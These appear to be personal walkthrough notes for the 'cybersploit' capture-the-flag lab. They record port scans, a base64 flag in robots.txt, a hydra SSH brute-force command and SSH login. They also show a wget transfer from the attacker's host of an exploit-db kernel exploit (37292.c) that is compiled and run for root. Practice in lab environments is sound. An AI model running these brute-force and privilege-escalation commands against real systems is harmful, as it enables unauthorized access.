22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))


nikto -host 
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.

robots.txt
Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0= 
	b64 to cybersploit{youtube.com/c/cybersploit} 


inspect element
	username:itsskv
SSH bruterforce
		hydra -v -V -u -l itsskv -P  /usr/share/wordlists/rockyou.txt -t 1 -u 192.168.51.92 ssh	



**user:**
ssh itsskv@192.168.51.92 
	password : cybersploit{youtube.com/c/cybersploit} 

Ubuntu 12.04.5

cat local.txt: [REDACTED]

**Priv:** 
	No sudo -l
	uname -l 
		Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 
		searchsploit 3.13.0 

**Transfer**
	cp /usr/share/exploitdb/exploits/linux/local/37292.c ~
	python -m SimpleHTTPServer -p 8080
	python3 -m http.server 9000 
	*from box* wget192.168.49.51:9000/37292.c 
	gcc 37292.c -o ofs 
	./ofs 
	id

**Root**
cat proof.txt
[REDACTED]